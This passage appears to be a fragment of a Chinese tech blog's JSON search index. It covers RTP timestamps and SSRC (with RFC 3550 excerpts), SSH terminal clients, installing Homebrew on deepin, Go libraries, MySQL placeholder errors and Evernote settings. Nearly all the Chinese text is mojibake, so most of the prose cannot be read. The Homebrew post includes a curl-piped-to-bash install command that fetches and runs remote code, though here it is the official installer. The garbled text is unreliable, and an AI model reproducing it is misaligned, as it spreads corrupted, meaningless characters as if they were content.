·æœ¬æ•°æ®ï¼Œæ¯ä¸ªæ ·æœ¬å ç”¨1ä¸ªå­—èŠ‚ã€‚å‘é€æ–¹ä¸€èˆ¬æ¯éš”20æ¯«ç§’å‘é€ä¸€ä¸ª20æ¯«ç§’å†…çš„æ‰€æœ‰é‡‡æ ·æ•°æ®ã€‚é‚£ä¹ˆä¸€ç§’é’Ÿå‘é€æ–¹ä¼šå‘é€1000/20=50ä¸ªRTPåŒ…ï¼Œ50ä¸ªæ•°æ®åŒ…å‘é€8000ä¸ªé‡‡æ ·æ•°æ®ï¼Œå¹³å‡æ¯éš”æ•°æ®åŒ…æºå¸¦8000/50=160ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚æ‰€ä»¥timestampçš„å¢é‡ä¸€èˆ¬æ˜¯160ï¼Œ åœ¨wiresharkä¸ŠæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°rtcæµçš„timeå­—æ®µæ˜¯æŒ‰ç…§160çš„æ­¥é•¿åœ¨å¢åŠ ã€‚ ç„¶åæˆ‘ä»¬åˆ†æå•ä¸ªçš„RTPæµï¼Œä»IPå±‚å¯ä»¥çœ‹å‡ºUDP payloadæ˜¯172ä¸ªå­—èŠ‚ï¼Œå®é™…ä¸Šå°±æ˜¯rtpçš„é‡‡æ ·æ•°æ®160 + RTPçš„å›ºå®šçš„12å­—èŠ‚çš„å¤´éƒ¨ ä½†æ˜¯ä¹Ÿæœ‰æ—¶å€™, timestampä¹Ÿå¹¶ä¸æ˜¯æ€»æ˜¯æŒ‰ç…§å›ºå®šçš„æ­¥é•¿å†å¢é•¿ï¼Œä¾‹å¦‚ä¸‹å›¾ï¼Œ3166508092çš„ä¸‹ä¸€ä¸ªåŒ…çš„Timeå­—æ®µçªç„¶å˜æˆ1307389520äº†ã€‚è¿™ç§æƒ…å†µæ¯”è¾ƒç‰¹æ®Šï¼Œä¸€èˆ¬æ˜¯å¤šä¸ªä¸åŒSSRCçš„è¯­éŸ³æµå†ç»è¿‡åŒä¸€ä¸ªSBCæ—¶ï¼ŒSSRCè¢«ä¿®æ”¹æˆç›¸åŒçš„å€¼ï¼Œä½†æ˜¯timestampå­—æ®µæ˜¯åŸæ ·ä¿ç•™çš„ã€‚å¯¼è‡´å‘å‡ºçš„RTPæµtimestampå­—æ®µä¸å†è¿ç»­ã€‚åœ¨wiresharkçš„æµåˆ†æä¸Šï¼Œä¹Ÿèƒ½çœ‹å‡ºå‡ºç°äº†ä¸æ­£å¸¸çš„timestampã€‚è¿™ç§ä¸æ­£å¸¸çš„timestampå¯¹äºæŸäº›sipuaæ¥è¯´ï¼Œå®ƒå¯èƒ½ä¼šå¿½ç•¥ä¸è¿ç»­çš„æ‰€æœ‰åç»­çš„RTPåŒ…ï¼Œè¿›è€Œå¯¼è‡´æ— æ³•æ”¾éŸ³çš„é—®é¢˜ã€‚æˆ‘å°±å±‚é‡åˆ°è¿‡fsç±»ä¼¼çš„é—®é¢˜ï¼Œä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯å‡çº§fs, å¦ä¸€ä¸ªæ–¹æ¡ˆæ˜¯è¯•ä¸‹ fsçš„rtp_rewrite_timestampsé€šé“å˜é‡ä¸ºtrueã€‚https://freeswitch.org/confluence/display/FREESWITCH/rtp_rewrite_timestamps The timestamp reflects the sampling instant of the first octet in the RTP data packet. The sampling instant MUST be derived from a clock that increments monotonically and linearly in time to allow synchronization and jitter calculations (see Section 6.4.1). The resolution of the clock MUST be sufficient for the desired synchronization accuracy and for measuring packet arrival jitter (one tick per video frame is typically not sufficient). The clock frequency is dependent on the format of data carried as payload and is specified statically in the profile or payload format specification that defines the format, or MAY be specified dynamically for payload formats defined through non-RTP means. If RTP packets are generated periodically, the nominal sampling instant as determined from the sampling clock is to be used, not a reading of the system clock. As an example, for fixed-rate audio the timestamp clock would likely increment by one for each sampling period. If an audio application reads blocks covering 160 sampling periods from the input device, the timestamp would be increased by 160 for each such block, regardless of whether the block is transmitted in a packet or dropped as silent. The initial value of the timestamp SHOULD be random, as for the sequence number. Several consecutive RTP packets will have equal timestamps if they are (logically) generated at once, e.g., belong to the same video frame. Consecutive RTP packets MAY contain timestamps that are not monotonic if the data is not transmitted in the order it was sampled, as in the case of MPEG interpolated video frames. (The sequence numbers of the packets as transmitted will still be monotonic.) RTP timestamps from different media streams may advance at different rates and usually have independent, random offsets. Therefore, although these timestamps are sufficient to reconstruct the timing of a single stream, directly comparing RTP timestamps from different media is not effective for synchronization. Instead, for each medium the RTP timestamp is related to the sampling instant by pairing it with a timestamp from a reference clock (wallclock) that represents the time when the data corresponding to the RTP timestamp was sampled. The reference clock is shared by all media to be synchronized. The timestamp pairs are not transmitted in every data packet, but at a lower rate in RTCP SR packets as described in Section 6.4. The sampling instant is chosen as the point of reference for the RTP timestamp because it is known to the transmitting endpoint and has a common definition for all media, independent of encoding delays or other processing. The purpose is to allow synchronized presentation of all media sampled at the same time. Applications transmitting stored data rather than data sampled in real time typically use a virtual presentation timeline derived from wallclock time to determine when the next frame or other unit of each medium in the stored data should be presented. In this case, the RTP timestamp would reflect the presentation time for each unit. That is, the RTP timestamp for each unit would be related to the wallclock time at which the unit becomes current on the virtual presentation timeline. Actual presentation occurs some time later as determined by the receiver. An example describing live audio narration of prerecorded video illustrates the significance of choosing the sampling instant as the reference point. In this scenario, the video would be presented locally for the narrator to view and would be simultaneously transmitted using RTP. The \u0026ldquo;sampling instant\u0026rdquo; of a video frame transmitted in RTP would be established by referencing\nits timestamp to the wallclock time when that video frame was presented to the narrator. The sampling instant for the audio RTP packets containing the narrator\u0026rsquo;s speech would be established by referencing the same wallclock time when the audio was sampled. The audio and video may even be transmitted by different hosts if the reference clocks on the two hosts are synchronized by some means such as NTP. A receiver can then synchronize presentation of the audio and video packets by relating their RTP timestamps using the timestamp pairs in RTCP SR packets.\nSSRC: 32 bits The SSRC field identifies the synchronization source. This identifier SHOULD be chosen randomly, with the intent that no two synchronization sources within the same RTP session will have the same SSRC identifier. An example algorithm for generating a random identifier is presented in Appendix A.6. Although the probability of multiple sources choosing the same identifier is low, all RTP implementations must be prepared to detect and resolve collisions. Section 8 describes the probability of collision along with a mechanism for resolving collisions and detecting RTP-level forwarding loops based on the uniqueness of the SSRC identifier. If a source changes its source transport address, it must also choose a new SSRC identifier to avoid being interpreted as a looped source (see Section 8.2).\nCSRC list: 0 to 15 items, 32 bits each The CSRC list identifies the contributing sources for the payload contained in this packet. The number of identifiers is given by the CC field. If there are more than 15 contributing sources, only 15 can be identified. CSRC identifiers are inserted by mixers (see Section 7.1), using the SSRC identifiers of contributing sources. For example, for audio packets the SSRC identifiers of all sources that were mixed together to create a packet are listed, allowing correct talker indication at the receiver.\nå‚è€ƒæ–‡æ¡£ http://www.rfcreader.com/#rfc3550 http://www.rfcreader.com/#rfc1889 ","permalink":"https://wdd.js.org/opensips/ch4/rtp-timestamp/","summary":"æœ€è¿‘é‡åˆ°ä¸€äº›å’Œåª’ä½“æµç›¸å…³çš„é—®é¢˜ï¼Œä½¿ç”¨wiresharkåˆ†æä¹‹åï¼Œæ€»ç®—æœ‰äº›çœ‰ç›®ã€‚ç„¶è€Œæˆ‘æ·±æ„Ÿå¯¹RTPåè®®çš„ç†è§£ï¼Œè¿˜æ˜¯è¶‹äºè¡¨é¢ã€‚æ‰€ä»¥æˆ‘å†³å®šï¼Œæ·±å…¥çš„å­¦ä¹ ä¸€ä¸‹RTPåè®®ã€‚\nå’Œrtpç›¸å…³çš„åè®®æœ‰ä¸¤ä¸ªrfc, åˆ†åˆ«æ˜¯\n1996çš„çš„ RFC 1889 2003å¹´çš„ RFC 3550 RFC 3550æ˜¯å¯¹RFC 1889çš„ç¨å¾®æ”¹è¿›ï¼Œç„¶è€Œå¤§ä½“ä¸Šæ˜¯æ²¡ä»€ä¹ˆæ”¹å˜çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹RFC 3550ã€‚\nRTP åº•å±‚ç”¨çš„æ˜¯UDPåè®® RTP çš„ä½¿ç”¨åœºæ™¯æ˜¯ä¼ è¾“å®æ—¶æ•°æ®ï¼Œä¾‹å¦‚è¯­éŸ³ï¼Œè§†é¢‘ï¼Œæ¨¡æ‹Ÿæ•°æ®ç­‰ç­‰ RTP å¹¶ä¸ä¿è¯QoS Synchronization source (SSRC): The source of a stream of RTP packets, identified by a 32-bit numeric SSRC identifier carried in the RTP header so as not to be dependent upon the network address. All packets from a synchronization source form part of the same timing and sequence number space, so a receiver groups packets by synchronization source for playback.","title":"RTP ä¸è¿ç»­çš„timestampå’ŒSSRC"},{"content":"è¦æ±‚ [å¿…é¡»] èƒ½å¤Ÿä¿å­˜å¯†ç , æˆ–è€…ç”¨ç§é’¥ç™»å½• [å¿…é¡»] èƒ½å¤Ÿæ”¯æŒftp/sftp [å¿…é¡»] å¼€æºå…è´¹ [å¿…é¡»] ç•Œé¢æ¼‚äº®ï¼Œæ”¯æŒä¸­æ–‡å­—ç¬¦ [å¯é€‰] æ”¯æŒåŒæ­¥sshé…ç½® [å¿…é¡»] æ”¯æŒè·¨å¹³å° Tabby A terminal for a more modern age (formerly Terminus) https://github.com/Eugeny/tabby https://tabby.sh/ 25.7k Star åŸºäºelectron, ä¸»è¦å¼€å‘è¯­è¨€typescript\nElecterm Terminal/ssh/sftp client(linux, mac, win) https://github.com/electerm/electerm https://electerm.github.io/electerm/ 4.8k star åŸºäºelectron, ä¸»è¦å¼€å‘è¯­è¨€javascript\nWindTerm A Quicker and better SSH/Telnet/Serial/Shell/Sftp client for DevOps.\nhttps://github.com/kingToolbox/WindTerm 2.6K star ä¸»è¦å¼€å‘è¯­è¨€: C\n","permalink":"https://wdd.js.org/posts/2021/12/","summary":"è¦æ±‚ [å¿…é¡»] èƒ½å¤Ÿä¿å­˜å¯†ç , æˆ–è€…ç”¨ç§é’¥ç™»å½• [å¿…é¡»] èƒ½å¤Ÿæ”¯æŒftp/sftp [å¿…é¡»] å¼€æºå…è´¹ [å¿…é¡»] ç•Œé¢æ¼‚äº®ï¼Œæ”¯æŒä¸­æ–‡å­—ç¬¦ [å¯é€‰] æ”¯æŒåŒæ­¥sshé…ç½® [å¿…é¡»] æ”¯æŒè·¨å¹³å° Tabby A terminal for a more modern age (formerly Terminus) https://github.com/Eugeny/tabby https://tabby.sh/ 25.7k Star åŸºäºelectron, ä¸»è¦å¼€å‘è¯­è¨€typescript\nElecterm Terminal/ssh/sftp client(linux, mac, win) https://github.com/electerm/electerm https://electerm.github.io/electerm/ 4.8k star åŸºäºelectron, ä¸»è¦å¼€å‘è¯­è¨€javascript\nWindTerm A Quicker and better SSH/Telnet/Serial/Shell/Sftp client for DevOps.\nhttps://github.com/kingToolbox/WindTerm 2.6K star ä¸»è¦å¼€å‘è¯­è¨€: C","title":"å¼€æºå…è´¹çš„sshç»ˆç«¯å·¥å…·"},{"content":"11æœˆ2å·ï¼Œæˆ‘çš„ä¸»åŠ›å¼€å‘å·¥å…·macbookå¼€å§‹é€€å½¹ã€‚\næˆ‘æ¢äº†nuc11 i7, å®‰è£…äº†å›½äº§çš„deepin(æ·±åº¦)æ“ä½œç³»ç»Ÿã€‚æ€»ä½“ä½“éªŒè›®å¥½çš„ï¼Œåªæ˜¯apt-getçš„è½¯ä»¶åŒ…é‡Œï¼Œå¤ªå¤šéƒ½æ˜¯å¾ˆè€çš„åŒ…ã€‚æ‰€ä»¥æˆ‘æƒ³åˆ°ä»¥å‰ç”¨macçš„åŒ…ç®¡ç†å·¥å…·homebrew, æ®è¯´å®ƒä¸ä»…ä»…å¯ä»¥åœ¨macä¸Šå·¥ä½œï¼Œä¸»æµçš„linuxä¹Ÿæ˜¯èƒ½å¤Ÿä½¿ç”¨çš„ã€‚\nhomebrewçš„ä»‹ç»æ˜¯ï¼šThe Missing Package Manager for macOS (or Linux)ã€‚ä¹Ÿå°±æ˜¯è¯´brewå®Œå…¨å¯ä»¥åœ¨linuxä¸Šè¿è¡Œã€‚\nå®‰è£…æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼š\n/bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; ä¸Šé¢çš„shellæ‰§è¡Œä¹‹åï¼Œbrewå°±å®‰è£…æˆåŠŸäº†ã€‚\nå’Œmacä¸åŒçš„æ˜¯ï¼Œlinux homebrewçš„å®‰è£…åŒ…çš„å¯æ‰§è¡Œå‘½ä»¤çš„ç›®å½•æ˜¯ï¼š/home/linuxbrew/.linuxbrew/bin, æ‰€ä»¥éœ€è¦æŠŠå®ƒåŠ å…¥åˆ°PATHä¸­ï¼Œå®‰è£…çš„è½¯ä»¶æ‰èƒ½æ­£ç¡®æ‰§è¡Œã€‚\nå‚è€ƒ https://brew.sh/ ","permalink":"https://wdd.js.org/posts/2021/11/","summary":"11æœˆ2å·ï¼Œæˆ‘çš„ä¸»åŠ›å¼€å‘å·¥å…·macbookå¼€å§‹é€€å½¹ã€‚\næˆ‘æ¢äº†nuc11 i7, å®‰è£…äº†å›½äº§çš„deepin(æ·±åº¦)æ“ä½œç³»ç»Ÿã€‚æ€»ä½“ä½“éªŒè›®å¥½çš„ï¼Œåªæ˜¯apt-getçš„è½¯ä»¶åŒ…é‡Œï¼Œå¤ªå¤šéƒ½æ˜¯å¾ˆè€çš„åŒ…ã€‚æ‰€ä»¥æˆ‘æƒ³åˆ°ä»¥å‰ç”¨macçš„åŒ…ç®¡ç†å·¥å…·homebrew, æ®è¯´å®ƒä¸ä»…ä»…å¯ä»¥åœ¨macä¸Šå·¥ä½œï¼Œä¸»æµçš„linuxä¹Ÿæ˜¯èƒ½å¤Ÿä½¿ç”¨çš„ã€‚\nhomebrewçš„ä»‹ç»æ˜¯ï¼šThe Missing Package Manager for macOS (or Linux)ã€‚ä¹Ÿå°±æ˜¯è¯´brewå®Œå…¨å¯ä»¥åœ¨linuxä¸Šè¿è¡Œã€‚\nå®‰è£…æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼š\n/bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; ä¸Šé¢çš„shellæ‰§è¡Œä¹‹åï¼Œbrewå°±å®‰è£…æˆåŠŸäº†ã€‚\nå’Œmacä¸åŒçš„æ˜¯ï¼Œlinux homebrewçš„å®‰è£…åŒ…çš„å¯æ‰§è¡Œå‘½ä»¤çš„ç›®å½•æ˜¯ï¼š/home/linuxbrew/.linuxbrew/bin, æ‰€ä»¥éœ€è¦æŠŠå®ƒåŠ å…¥åˆ°PATHä¸­ï¼Œå®‰è£…çš„è½¯ä»¶æ‰èƒ½æ­£ç¡®æ‰§è¡Œã€‚\nå‚è€ƒ https://brew.sh/ ","title":"ä½¿ç”¨brewä½œä¸ºdeepinçš„åŒ…ç®¡ç†å·¥å…·"},{"content":"webæ¡†æ¶ https://github.com/gofiber/fiber http client https://github.com/go-resty/resty mock https://github.com/jarcoal/httpmock é¡¹ç›®ç»“æ„ https://github.com/golang-standards/project-layout ç¯å¢ƒå˜é‡æ“ä½œ https://github.com/caarlos0/env https://github.com/kelseyhightower/envconfig æµ‹è¯•æ¡†æ¶ https://github.com/stretchr/testify æ—¥å¿—æ¡†æ¶ https://github.com/uber-go/zap htmlè§£æ https://github.com/PuerkitoBio/goquery cliå·¥å…· https://github.com/urfave/cli å„ç§åº“å¤§å…¨é›† https://github.com/avelino/awesome-go ç»ˆç«¯é¢œè‰² https://github.com/fatih/color å‰ªè´´æ¿ https://github.com/atotto/clipboard æ•°æ®åº“é©±åŠ¨ https://github.com/go-sql-driver/mysql çƒ­é‡è½½ https://github.com/cosmtrek/air æ—¶é—´å¤„ç† https://github.com/golang-module/carbon é”™è¯¯å°è£… https://github.com/pkg/errors ç»“æ„ä½“è½¬äºŒè¿›åˆ¶ https://github.com/lunixbochs/struc VIMæ™ºèƒ½è¡¥å…¨æç¤º éœ€è¦å®‰è£…coc-go, è¿˜æœ‰vim-go\n","permalink":"https://wdd.js.org/golang/my-start-repo/","summary":"webæ¡†æ¶ https://github.com/gofiber/fiber http client https://github.com/go-resty/resty mock https://github.com/jarcoal/httpmock é¡¹ç›®ç»“æ„ https://github.com/golang-standards/project-layout ç¯å¢ƒå˜é‡æ“ä½œ https://github.com/caarlos0/env https://github.com/kelseyhightower/envconfig æµ‹è¯•æ¡†æ¶ https://github.com/stretchr/testify æ—¥å¿—æ¡†æ¶ https://github.com/uber-go/zap htmlè§£æ https://github.com/PuerkitoBio/goquery cliå·¥å…· https://github.com/urfave/cli å„ç§åº“å¤§å…¨é›† https://github.com/avelino/awesome-go ç»ˆç«¯é¢œè‰² https://github.com/fatih/color å‰ªè´´æ¿ https://github.com/atotto/clipboard æ•°æ®åº“é©±åŠ¨ https://github.com/go-sql-driver/mysql çƒ­é‡è½½ https://github.com/cosmtrek/air æ—¶é—´å¤„ç† https://github.com/golang-module/carbon é”™è¯¯å°è£… https://github.com/pkg/errors ç»“æ„ä½“è½¬äºŒè¿›åˆ¶ https://github.com/lunixbochs/struc VIMæ™ºèƒ½è¡¥å…¨æç¤º éœ€è¦å®‰è£…coc-go, è¿˜æœ‰vim-go","title":"æˆ‘å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“"},{"content":" Error EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026lsquo;? ( ç„¶è€Œæˆ‘ä»”ç»†çœ‹äº†çœ‹sqlè¯­å¥ï¼Œæ²¡æœ‰çœ‹å‡ºæ¥ç©¶ç«Ÿå“ªé‡Œæœ‰sqlæŠ¥é”™ã€‚\nç„¶è€Œå½“æˆ‘æŠŠä½œä¸ºplaceholderçš„é—®å·å»æ‰ï¼Œç›´æ¥ç”¨è¡¨çš„åå­—ï¼Œsqlæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ã€‚æˆ‘æ„è¯†åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å’Œplaceholderæœ‰å…³ã€‚\næœç´¢äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€ä¸ªé“¾æ¥ https://github.com/go-sql-driver/mysql/issues/848\nPlaceholder can\u0026rsquo;t be used for table name or column name. It\u0026rsquo;s MySQL spec. Not bug of this project.\nå¤§æ„æ˜¯è¯´ï¼Œplaceholderæ˜¯ä¸èƒ½ä½œä¸ºè¡¨åæˆ–è€…åˆ—åçš„ã€‚\nåœ¨mysqlå…³äºpreparedæ–‡æ¡£ä»‹ç»ä¸­ï¼Œåœ¨å…è®¸ä½¿ç”¨preparedçš„è¯­å¥é‡Œï¼Œæ²¡æœ‰çœ‹åˆ°create tableå¯ä»¥ç”¨placeholder https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html\npreparedè¯­å¥çš„ä¼˜ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ª\nä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦ é˜²æ­¢sqlæ³¨å…¥ ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›é™åˆ¶\nä¸æ˜¯æ‰€æœ‰è¯­å¥éƒ½èƒ½ç”¨preparedè¯­å¥ã€‚å¸¸è§çš„ç”¨æ³•åº”è¯¥æ˜¯ä½œä¸ºselect whereä¹‹åçš„æ¡ä»¶ï¼Œæˆ–è€…INSERTè¯­å¥ä¹‹åçš„å€¼ ä¸æ”¯æŒä¸€ä¸ªsqlä¸­å¤šæ¡æŸ¥è¯¢è¯­å¥çš„å½¢å¼ ","permalink":"https://wdd.js.org/golang/mysql-placeholder/","summary":" Error EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026lsquo;? ( ç„¶è€Œæˆ‘ä»”ç»†çœ‹äº†çœ‹sqlè¯­å¥ï¼Œæ²¡æœ‰çœ‹å‡ºæ¥ç©¶ç«Ÿå“ªé‡Œæœ‰sqlæŠ¥é”™ã€‚\nç„¶è€Œå½“æˆ‘æŠŠä½œä¸ºplaceholderçš„é—®å·å»æ‰ï¼Œç›´æ¥ç”¨è¡¨çš„åå­—ï¼Œsqlæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ã€‚æˆ‘æ„è¯†åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å’Œplaceholderæœ‰å…³ã€‚\næœç´¢äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€ä¸ªé“¾æ¥ https://github.com/go-sql-driver/mysql/issues/848\nPlaceholder can\u0026rsquo;t be used for table name or column name. It\u0026rsquo;s MySQL spec. Not bug of this project.\nå¤§æ„æ˜¯è¯´ï¼Œplaceholderæ˜¯ä¸èƒ½ä½œä¸ºè¡¨åæˆ–è€…åˆ—åçš„ã€‚\nåœ¨mysqlå…³äºpreparedæ–‡æ¡£ä»‹ç»ä¸­ï¼Œåœ¨å…è®¸ä½¿ç”¨preparedçš„è¯­å¥é‡Œï¼Œæ²¡æœ‰çœ‹åˆ°create tableå¯ä»¥ç”¨placeholder https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html\npreparedè¯­å¥çš„ä¼˜ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ª\nä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦ é˜²æ­¢sqlæ³¨å…¥ ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›é™åˆ¶\nä¸æ˜¯æ‰€æœ‰è¯­å¥éƒ½èƒ½ç”¨preparedè¯­å¥ã€‚å¸¸è§çš„ç”¨æ³•åº”è¯¥æ˜¯ä½œä¸ºselect whereä¹‹åçš„æ¡ä»¶ï¼Œæˆ–è€…INSERTè¯­å¥ä¹‹åçš„å€¼ ä¸æ”¯æŒä¸€ä¸ªsqlä¸­å¤šæ¡æŸ¥è¯¢è¯­å¥çš„å½¢å¼ ","title":"mysql placeholderçš„é”™è¯¯ä½¿ç”¨æ–¹å¼"},{"content":"ä¸ºä»€ä¹ˆæ˜¯å°è±¡ç¬”è®° ä½œä¸ºä¸€ä¸ªç¬”è®°ï¼Œæˆ–è€…è¯´æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œä¸€ä¸ªæœ€åŸºæœ¬çš„è¦æ±‚ï¼Œå°±æ˜¯èƒ½æŒ‰ç…§ç”¨æˆ·çš„æŒ‰é”®è¾“å…¥ã€‚è€Œä¸æ˜¯ç”¨æˆ·è¾“å…¥äº†Aï¼Œç„¶ååœ¨é¡µé¢ä¸Šçœ‹åˆ°äº†Bã€‚\nä½†æ˜¯å¯¹äºå°è±¡ç¬”è®°æ¥è¯´ï¼Œæˆ‘å·²ç»é‡åˆ°è¿‡å¥½å¤šæ¬¡å› ä¸ºè¾“å…¥é—®é¢˜ï¼Œå‡ ä¹æƒ³è¦æ”¾å¼ƒå°è±¡ç¬”è®°ã€‚ä½†æ˜¯å°±ç›®å‰æ¥è®²ï¼Œä»ç„¶æ²¡æœ‰å¥½ç”¨çš„æ›¿ä»£å“ã€‚\nå¯¹äºç¬”è®°è½¯ä»¶æ¥è¯´ï¼Œæˆ‘æœ‰ä»¥ä¸‹çš„å‡ ä¸ªæœ€ä¸ºåŸºç¡€çš„è¦æ±‚ã€‚\nå¿…é¡»è·¨å¹³å°ã€‚èƒ½å¤Ÿæœ‰æ¡Œé¢ç«¯Appå’ŒIOSæˆ–è€…å®‰å“çš„APP å¿…é¡»åŒæ­¥è¦å¿«ã€‚ å¿…é¡»è¦èƒ½æœ‰ç½‘é¡µå‰ªè—çš„æ’ä»¶ å¿…é¡»è¦å°‘æŠ˜è…¾ï¼Œç”¨æˆ·ä½“éªŒå¥½ã€‚æˆ‘çš„ç›®çš„æ˜¯è®°å½•å†…å®¹ï¼Œè€Œä¸æ˜¯æŠ˜è…¾å„ç§åŒæ­¥æˆ–è€…ç½‘ç»œé…ç½®ã€‚ å¿…é¡»æ˜¯ä»˜è´¹çš„äº§å“ã€‚å…è´¹çš„äº§å“ï¼Œæ˜¯æ²¡æœ‰å¯æŒç»­å‘å±•æ½œåŠ›çš„ã€‚å½“ç„¶ï¼Œä»˜è´¹éœ€è¦åœ¨æ¥å—èŒƒå›´ä¹‹å†…ã€‚ å¿…é¡»è¶³å¤Ÿç¨³å®š ç”¨æˆ·ç•Œé¢ï¼Œä½“éªŒå¿…é¡»è¶³å¤Ÿå¥½ å¿…é¡»è¦ç¦»çº¿ä½¿ç”¨ å°±ç›®å‰æ¥è¯´ï¼Œèƒ½æ»¡è¶³ä»¥ä¸Šå‡ ä¸ªè¦æ±‚çš„ï¼Œå±ˆæŒ‡å¯æ•°ã€‚\nå°è±¡ç¬”è®°è™½ç„¶æœ‰æ¶å¿ƒçš„å¹¿å‘Šæ¨é€(å³ä½¿ä¼šå‘˜ä¹Ÿæœ‰å¹¿å‘Š)ï¼Œä½†æ˜¯ä¸€èˆ¬åœ¨éç‰¹æ®Šçš„æ—¥å­ï¼Œå¹¿å‘Šä¸å›ä¸€ç›´å­˜åœ¨çš„ã€‚\nå°è±¡ç¬”è®°ä¸å¤ªæ™ºèƒ½çš„æ›¿æ¢ æŠŠè‹±æ–‡å•å¼•å·æ›¿æ¢æˆä¸­æ–‡å•å¼•å· æŠŠä¸¤ä¸ª\u0026ndash;å¤©æ¢æˆä¸€ä¸ªä¸­æ–‡ç ´æŠ˜å· ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜ï¼Œåœ¨ç²˜è´´ä»£ç çš„æ—¶å€™ï¼Œæ˜¯è‡´å‘½çš„é—®é¢˜ã€‚æˆ‘æœ¬æ¥ç²˜è´´çš„æ˜¯ä¸¤ä¸ª\u0026ndash;ï¼Œç²˜è´´åˆ°å°è±¡ç¬”è®°é‡Œå±…ç„¶å˜æˆä¸€ä¸ªä¸­æ–‡ç ´æŠ˜å·ï¼Œé‚£ä¹ˆåæœŸåœ¨å¤åˆ¶å‡ºæ¥ç”¨çš„ï¼Œå¿…ç„¶å‡ºç°é—®é¢˜ã€‚\næˆ‘é—®äº†å®˜æ–¹çš„å®¢æœï¼Œå®˜æ–¹çš„å®¢æˆ·ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè§£å†³ã€‚\nåæ¥æˆ‘è‡ªå·±åœ¨ç½‘ä¸Šæœç´¢ï¼Œå‘ç°äº†è§£å†³é—®é¢˜çš„æ–¹æ³•ã€‚\nä»¥ä¸Šæ‰€æœ‰çš„å…³äºæ›¿æ¢çš„é—®é¢˜ï¼Œéƒ½æ˜¯å’Œç¼–è¾‘å™¨çš„æ›¿æ¢è®¾ç½®æœ‰å…³ã€‚\næ‰“å¼€ä¸€ä¸ªç¬”è®°ï¼Œç„¶åç‚¹å‡»å³é”®\né€‰æ‹©æ›¿æ¢ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰æ™ºèƒ½å¼•å·ï¼Œåªèƒ½ç ´æŠ˜å·ï¼Œæ™ºèƒ½è¿æ¥ï¼Œæ–‡æœ¬æ›¿æ¢ï¼Œå»ºè®®æŠŠè¿™å‡ ä¸ªéƒ½å–æ¶ˆå‹¾é€‰\nè¿˜æœ‰ä¸€ä¸ªå¯èƒ½æ€§ï¼Œå°±æ˜¯åœ¨**ç¼–è¾‘-\u0026gt;æ‹¼å†™å’Œè¯­æ³•-\u0026gt;è‡ªåŠ¨æ‹¼å†™çº æ­£ï¼Œ**è¿™ä¸ªè¦å…³é—­ã€‚\n","permalink":"https://wdd.js.org/posts/2021/10/","summary":"ä¸ºä»€ä¹ˆæ˜¯å°è±¡ç¬”è®° ä½œä¸ºä¸€ä¸ªç¬”è®°ï¼Œæˆ–è€…è¯´æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œä¸€ä¸ªæœ€åŸºæœ¬çš„è¦æ±‚ï¼Œå°±æ˜¯èƒ½æŒ‰ç…§ç”¨æˆ·çš„æŒ‰é”®è¾“å…¥ã€‚è€Œä¸æ˜¯ç”¨æˆ·è¾“å…¥äº†Aï¼Œç„¶ååœ¨é¡µé¢ä¸Šçœ‹åˆ°äº†Bã€‚\nä½†æ˜¯å¯¹äºå°è±¡ç¬”è®°æ¥è¯´ï¼Œæˆ‘å·²ç»é‡åˆ°è¿‡å¥½å¤šæ¬¡å› ä¸ºè¾“å…¥é—®é¢˜ï¼Œå‡ ä¹æƒ³è¦æ”¾å¼ƒå°è±¡ç¬”è®°ã€‚ä½†æ˜¯å°±ç›®å‰æ¥è®²ï¼Œä»ç„¶æ²¡æœ‰å¥½ç”¨çš„æ›¿ä»£å“ã€‚\nå¯¹äºç¬”è®°è½¯ä»¶æ¥è¯´ï¼Œæˆ‘æœ‰ä»¥ä¸‹çš„å‡ ä¸ªæœ€ä¸ºåŸºç¡€çš„è¦æ±‚ã€‚\nå¿…é¡»è·¨å¹³å°ã€‚èƒ½å¤Ÿæœ‰æ¡Œé¢ç«¯Appå’ŒIOSæˆ–è€…å®‰å“çš„APP å¿…é¡»åŒæ­¥è¦å¿«ã€‚ å¿…é¡»è¦èƒ½æœ‰ç½‘é¡µå‰ªè—çš„æ’ä»¶ å¿…é¡»è¦å°‘æŠ˜è…¾ï¼Œç”¨æˆ·ä½“éªŒå¥½ã€‚æˆ‘çš„ç›®çš„æ˜¯è®°å½•å†…å®¹ï¼Œè€Œä¸æ˜¯æŠ˜è…¾å„ç§åŒæ­¥æˆ–è€…ç½‘ç»œé…ç½®ã€‚ 